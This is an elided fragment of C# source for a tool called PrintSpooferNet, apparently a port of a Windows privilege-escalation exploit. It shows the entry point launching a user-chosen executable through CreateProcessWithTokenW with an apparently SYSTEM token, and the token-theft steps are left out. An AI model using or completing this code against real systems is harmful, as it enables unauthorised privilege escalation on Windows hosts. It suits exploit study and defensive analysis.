...
namespace PrintSpooferNet
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Usage: PrintSpooferNet.exe pipename [path to PE]");
                return;
            }
            ...
            string path = args[1];
            CreateProcessWithTokenW(hSystemToken, 0, null, path, 0, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine(@"Execute to path", sidstr);
